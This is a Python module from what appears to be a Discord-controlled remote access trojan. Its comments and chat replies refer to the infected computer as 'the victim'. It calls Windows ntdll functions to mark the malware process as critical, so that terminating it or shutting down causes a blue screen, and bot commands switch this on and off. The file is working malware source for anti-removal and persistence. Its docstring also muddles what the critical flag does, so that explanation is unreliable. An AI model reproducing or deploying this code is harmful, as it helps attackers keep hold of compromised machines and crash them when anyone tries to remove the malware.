"""Raise or lower the critical status of the runtime process.

A critical process is killed by Windows when the machine shuts down. That
makes the runtime survive a restart of the victim, but it can also cause a
blue screen of death while the machine is shutting down.
"""

import ctypes

from discord.ext import commands
from discord.ext.commands import Context

# Privilege that allows changing the critical flag of a process.
SE_DEBUG_PRIVILEGE = 20


def set_critical_state(enabled: bool) -> None:
    """Set or clear the critical flag of the running process."""
    ctypes.windll.ntdll.RtlAdjustPrivilege(
        SE_DEBUG_PRIVILEGE,
        1,
        0,
        ctypes.byref(ctypes.c_bool()),
    )
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1 if enabled else 0, 0, 0)


async def set_critical(ctx: Context[commands.Bot]) -> None:
    """Mark the runtime as a critical process."""
    try:
        set_critical_state(True)
    except Exception as exc:
        print(f"Critical error: {exc}")
        await ctx.reply("Could not raise the process to critical status.")
        return

    await ctx.reply(
        "The process is critical now. It survives a shutdown of the victim, "
        "but that shutdown can end in a blue screen."
    )


async def unset_critical(ctx: Context[commands.Bot]) -> None:
    """Remove the critical status from the runtime process."""
    try:
        set_critical_state(False)
    except Exception as exc:
        print(f"Critical error: {exc}")
        await ctx.reply("Could not remove the critical status.")
        return

    await ctx.reply("The process is no longer critical.")
